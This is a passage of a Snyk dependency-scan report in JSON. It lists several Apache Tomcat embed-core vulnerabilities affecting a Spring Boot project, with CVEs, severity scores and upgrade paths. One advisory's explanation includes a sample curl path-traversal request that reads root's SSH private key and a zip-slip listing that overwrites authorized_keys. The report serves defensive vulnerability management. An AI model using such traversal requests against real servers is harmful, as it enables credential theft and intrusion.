engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.90, 8.0.52, 8.5.32, 9.0.10 or higher.\n## References\n- [AlphaBot Security Blog](https://www.alphabot.com/security/blog/2018/java/Apache-Tomcat-user-session-mix-up-and-DoS.html#no-host-name-verification-in-websocket-client)\n- [Apache Tomcat Release 7](https://tomcat.apache.org/security-7.html)\n- [Apache Tomcat Release 8](https://tomcat.apache.org/security-8.html)\n- [Apache Tomcat Release 9](https://tomcat.apache.org/security-9.html)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/92cd494555598e99dd691712e8ee426a2f9c2e93)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1607591)\n",
      "disclosureTime": "2018-07-22T00:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.90",
        "8.0.52",
        "8.5.32",
        "9.0.10"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451508",
      "identifiers": {
        "CVE": [
          "CVE-2018-1336"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:35.155050Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-07-24T15:14:13Z",
      "references": [
        {
          "title": "AlphaBot Security Blog",
          "url": "https://www.alphabot.com/security/blog/2018/java/Apache-Tomcat-user-session-mix-up-and-DoS.html%23no-host-name-verification-in-websocket-client"
        },
        {
          "title": "Apache Tomcat Release 7",
          "url": "https://tomcat.apache.org/security-7.html"
        },
        {
          "title": "Apache Tomcat Release 8",
          "url": "https://tomcat.apache.org/security-8.html"
        },
        {
          "title": "Apache Tomcat Release 9",
          "url": "https://tomcat.apache.org/security-9.html"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/92cd494555598e99dd691712e8ee426a2f9c2e93"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1607591"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,7.0.90)",
          "[8.0.0, 8.0.52)",
          "[8.5.0, 8.5.32)",
          "[9.0.0, 9.0.10)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.15.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.5.15.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.32"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-07-04T10:50:12.298111Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Directory Traversal. Security constraints defined by annotations of Servlets were only applied once a Servlet had been loaded. Because security constraints defined in this way apply to the URL pattern and any URLs below that point, it was possible - depending on the order Servlets were loaded - for some security constraints not to be applied. This could have exposed resources to users who were not authorised to access them.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.5, 8.5.28, 8.0.50, 7.0.85 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/d3354bb0a4eda4acc0a66f3eb24a213fdb75d12c7d16060b23e65781@%3Cannounce.tomcat.apache.org%3E)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/3e54b2a6314eda11617ff7a7b899c251e222b1a1)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/4d637bc3986e5d09b9363e2144b8ba74fa6eac3a)\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-1305)\n",
      "disclosureTime": "2018-02-23T23:03:15Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "9.0.5",
        "8.5.28",
        "8.0.50",
        "7.0.85"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451510",
      "identifiers": {
        "CVE": [
          "CVE-2018-1305"
        ],
        "CWE": [
          "CWE-22"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:40:49.870867Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-02-25T14:35:15Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/d3354bb0a4eda4acc0a66f3eb24a213fdb75d12c7d16060b23e65781@%3Cannounce.tomcat.apache.org%3E"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/3e54b2a6314eda11617ff7a7b899c251e222b1a1"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/4d637bc3986e5d09b9363e2144b8ba74fa6eac3a"
        },
        {
          "title": "NVD",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1305"
        }
      ],
      "semver": {
        "vulnerable": [
          "[9.0.0M1,9.0.5)",
          "[8.5.0,8.5.28)",
          "[8.0.0RC1,8.0.50)",
          "[7.0.0,7.0.85)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Directory Traversal",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.11.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.5.11.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.29"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-07-04T10:55:56.632126Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Access Restriction Bypass. The URL pattern of  (the empty string) which exactly maps to the context root was not correctly handled, this caused the constraint to be ignored. It was, therefore, possible for unauthorised users to gain access to web application resources that should have been protected. Only security constraints with a URL pattern of the empty string were affected.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.85, 8.0.50, 8.5.28, 9.0.5 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/b1d7e2425d6fd2cebed40d318f9365b44546077e10949b01b1f8a0fb@%3Cannounce.tomcat.apache.org%3E)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/723ea6a5bc5e7bc49e5ef84273c3b3c164a6a4fd)\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-1304)\n- [Security Tracker](https://www.securitytracker.com/id/1040427)\n",
      "disclosureTime": "2018-02-23T12:40:11Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.85",
        "8.0.50",
        "8.5.28",
        "9.0.5"
      ],
      "functions": [
        {
          "functionId": {
            "className": "RealmBase",
            "filePath": "org/apache/catalina/realm/RealmBase.java",
            "functionName": "findSecurityConstraints"
          },
          "version": [
            "[7.0.0,7.0.85)",
            "[8.0.0.RC1,8.0.50)",
            "[8.5.0,8.5.28)",
            "[9.0.0.M1,9.0.5)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.catalina.realm.RealmBase",
            "functionName": "findSecurityConstraints"
          },
          "version": [
            "[7.0.0,7.0.85)",
            "[8.0.0.RC1,8.0.50)",
            "[8.5.0,8.5.28)",
            "[9.0.0.M1,9.0.5)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451511",
      "identifiers": {
        "CVE": [
          "CVE-2018-1304"
        ],
        "CWE": [
          "CWE-284"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2021-01-22T16:40:09.746272Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-03-05T17:08:07Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/b1d7e2425d6fd2cebed40d318f9365b44546077e10949b01b1f8a0fb@%3Cannounce.tomcat.apache.org%3E"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/723ea6a5bc5e7bc49e5ef84273c3b3c164a6a4fd"
        },
        {
          "title": "NVD",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1304"
        },
        {
          "title": "Security Tracker",
          "url": "https://www.securitytracker.com/id/1040427"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.85)",
          "[8.0.0.RC1,8.0.50)",
          "[8.5.0,8.5.28)",
          "[9.0.0.M1,9.0.5)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Access Restriction Bypass",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.11.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.5.11.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.29"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-07-04T11:08:09.902704Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.\r\n\r\nThis is due to an incomplete fix for [CVE-2017-12615](https://snyk.io/vuln/SNYK-JAVA-ORGAPACHETOMCAT-31534).\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.82, 8.0.46, 8.5.22, 9.0.1 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/3fd341a604c4e9eab39e7eaabbbac39c30101a022acc11dd09d7ebcb@%3Cannounce.tomcat.apache.org%3E)\n- [Apache Security Bulletin](http://tomcat.apache.org/security-8.html)\n- [Apache Tomcat Bugzilla](https://bz.apache.org/bugzilla/show_bug.cgi?id=61542)\n- [Exploit DB](https://exploit-db.com/exploits/43008)\n- [Exploit DB](https://www.exploit-db.com/exploits/42966)\n- [GitHub Changelog](https://github.com/apache/tomcat/blob/52a2f5ba1eb954c93d52897b25d3599bda271f88/webapps/docs/changelog.xml#L51)\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/e76505ba9bb59d9a8b5ae7c103867b00005ac676)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/24aea94807f940ee44aa550378dc903289039ddd)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/46dfedbc0523d7182be97f4244d7b6c942164485)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/74ad0e216c791454a318c1811300469eedc5c6f3)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/a9dd96046d7acb0357c6b7b9e6cc70d186fae663)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/bbcbb749c75056a2781f37038d63e646fe972104)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/cf0b37beb0622abdf24acc7110daf883f3fe4f95)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/d5b170705d24c386d76038e5989045c89795c28c)\n- [PoC by cyberheartmi9](https://github.com/cyberheartmi9/CVE-2017-12617)\n- [RedHat CVE Database](https://access.redhat.com/security/cve/cve-2017-12617)\n",
      "disclosureTime": "2017-09-21T21:00:00Z",
      "exploit": "High",
      "fixedIn": [
        "7.0.82",
        "8.0.46",
        "8.5.22",
        "9.0.1"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451515",
      "identifiers": {
        "CVE": [
          "CVE-2017-12617"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:18.794566Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-10-11T09:30:20Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/3fd341a604c4e9eab39e7eaabbbac39c30101a022acc11dd09d7ebcb@%3Cannounce.tomcat.apache.org%3E"
        },
        {
          "title": "Apache Security Bulletin",
          "url": "http://tomcat.apache.org/security-8.html"
        },
        {
          "title": "Apache Tomcat Bugzilla",
          "url": "https://bz.apache.org/bugzilla/show_bug.cgi?id=61542"
        },
        {
          "title": "Exploit DB",
          "url": "https://exploit-db.com/exploits/43008"
        },
        {
          "title": "Exploit DB",
          "url": "https://www.exploit-db.com/exploits/42966"
        },
        {
          "title": "GitHub Changelog",
          "url": "https://github.com/apache/tomcat/blob/52a2f5ba1eb954c93d52897b25d3599bda271f88/webapps/docs/changelog.xml%23L51"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/e76505ba9bb59d9a8b5ae7c103867b00005ac676"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/24aea94807f940ee44aa550378dc903289039ddd"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/46dfedbc0523d7182be97f4244d7b6c942164485"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/74ad0e216c791454a318c1811300469eedc5c6f3"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/a9dd96046d7acb0357c6b7b9e6cc70d186fae663"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/bbcbb749c75056a2781f37038d63e646fe972104"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/cf0b37beb0622abdf24acc7110daf883f3fe4f95"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/d5b170705d24c386d76038e5989045c89795c28c"
        },
        {
          "title": "PoC by cyberheartmi9",
          "url": "https://github.com/cyberheartmi9/CVE-2017-12617"
        },
        {
          "title": "RedHat CVE Database",
          "url": "https://access.redhat.com/security/cve/cve-2017-12617"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,7.0.82)",
          "[8,8.0.46)",
          "[8.5,8.5.22)",
          "[9.0.0.M1, 9.0.1)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.8.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.5.8.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.23"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
      "alternativeIds": [],
      "creationTime": "2019-07-04T11:32:22.954538Z",
      "credit": [
        "Aniket Nandkishor Kulkarni"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Access Restriction Bypass. The error page mechanism of the Java Servlet Specification requires that, when an error occurs and an error page is configured for the error that occurred, the original request and response are forwarded to the error page. This means that the request is presented to the error page with the original HTTP method. If the error page is a static file, expected behaviour is to serve content of the file as if processing a GET request, regardless of the actual HTTP method. The Default Servlet in Apache Tomcat 9.0.0.M1 to 9.0.0.M20, 8.5.0 to 8.5.14, 8.0.0.RC1 to 8.0.43 and 7.0.0 to 7.0.77 did not do this. Depending on the original request this could lead to unexpected and undesirable results for static error pages including, if the DefaultServlet is configured to permit writes, the replacement or removal of the custom error page. Notes for other user provided error pages: (1) Unless explicitly coded otherwise, JSPs ignore the HTTP method. JSPs used as error pages must must ensure that they handle any error dispatch as a GET request, regardless of the actual method. (2) By default, the response generated by a Servlet does depend on the HTTP method. Custom Servlets used as error pages must ensure that they handle any error dispatch as a GET request, regardless of the actual method.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.78, 8.0.44, 8.5.15, 9.0.0.M21 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/25d3c0d93190ef165ecd6c744bc15b5059abfa8f)\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/e070a31ec81b56377822e44883c64abb41f36a3b)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/29893e66111d33cfe99dd01cb146317c0c262ef4)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/3242efea525df01d15da6e90ea69a9a21b10b454)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/3bfe9fb886598c4d8ecbe674216152006bbce456)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/4545dcce444aa619374a659cb450dbbd0be3c921)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/58b32048ce25cb812ae394dafb0cd57254c68155)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/7d93527254d9e9371b342800617f20d13c8b85ad)\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-5664)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id&#x3D;1459158)\n",
      "disclosureTime": "2017-05-01T21:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.78",
        "8.0.44",
        "8.5.15",
        "9.0.0.M21"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451519",
      "identifiers": {
        "CVE": [
          "CVE-2017-5664"
        ],
        "CWE": [
          "CWE-254"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:40:49.908476Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-10-09T15:29:34Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/25d3c0d93190ef165ecd6c744bc15b5059abfa8f"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/e070a31ec81b56377822e44883c64abb41f36a3b"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/29893e66111d33cfe99dd01cb146317c0c262ef4"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/3242efea525df01d15da6e90ea69a9a21b10b454"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/3bfe9fb886598c4d8ecbe674216152006bbce456"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/4545dcce444aa619374a659cb450dbbd0be3c921"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/58b32048ce25cb812ae394dafb0cd57254c68155"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/7d93527254d9e9371b342800617f20d13c8b85ad"
        },
        {
          "title": "NVD",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-5664"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id&%23x3D%3B1459158"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7.0.0,7.0.78)",
          "[8.0.0RC1,8.0.44)",
          "[8.5.0,8.5.15)",
          "[9.0.0.M1,9.0.0.M21)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Access Restriction Bypass",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.7.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.4.7.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.15"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.tomcat.embed:tomcat-embed-core",
      "version": "8.0.30"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-07-04T11:39:38.758541Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Information Exposure. The refactoring of the Connector code for 8.5.x onwards introduced a regression in the error handling of the send file code for the NIO HTTP connector. An error during send file processing resulted in the current Processor object being added to the Processor cache multiple times. This in turn meant that the same Processor could be used for concurrent requests. Sharing a Processor can result in information leakage between requests including, not not limited to, session ID and the response body.\n## Remediation\nUpgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 7.0.74, 8.5.9, 8.0.40, 9.0.0M15 or higher.\n## References\n- [Apache Security Advisory](http://tomcat.apache.org/security-8.html#Fixed_in_Apache_Tomcat_8.5.9)\n- [Bugtraq Mailing List](http://seclists.org/bugtraq/2016/Dec/15)\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/3dd2fec73e0de1edc1d3eb1c52a01255fdfc84e7)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/143bb466cf96a89e791b7db5626055ea819dad89)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/16a57bc885e212839f1d717b94b01d154a36943a)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/cbc9b18a845d3c8c053ac293dffda6c6c19dd92b)\n",
      "disclosureTime": "2016-12-13T04:53:40Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "7.0.74",
        "8.5.9",
        "8.0.40",
        "9.0.0M15"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGAPACHETOMCATEMBED-451521",
      "identifiers": {
        "CVE": [
          "CVE-2016-8745"
        ],
        "CWE": [
          "CWE-200"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "tomcat-embed-core",
        "groupId": "org.apache.tomcat.embed"
      },
      "modificationTime": "2020-12-14T14:41:30.053935Z",
      "moduleName": "org.apache.tomcat.embed:tomcat-embed-core",
      "packageManager": "maven",
      "packageName": "org.apache.tomcat.embed:tomcat-embed-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-12-13T04:53:40Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "http://tomcat.apache.org/security-8.html%23Fixed_in_Apache_Tomcat_8.5.9"
        },
        {
          "title": "Bugtraq Mailing List",
          "url": "http://seclists.org/bugtraq/2016/Dec/15"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/3dd2fec73e0de1edc1d3eb1c52a01255fdfc84e7"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/143bb466cf96a89e791b7db5626055ea819dad89"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/16a57bc885e212839f1d717b94b01d154a36943a"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/cbc9b18a845d3c8c053ac293dffda6c6c19dd92b"
        }
      ],
      "semver": {
        "vulnerable": [
          "[7,7.0.74)",
          "[8.5.0,8.5.9)",
          "[8.0.0RC1,8.0.40)",
          "[9.0.0M1,9.0.0M15)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.3.1.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.0.30"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.4.RELEASE",
        "org.springframework.boot:spring-boot-starter-tomcat@1.4.4.RELEASE",
        "org.apache.tomcat.embed:tomcat-embed-core@8.5.11"
      ],
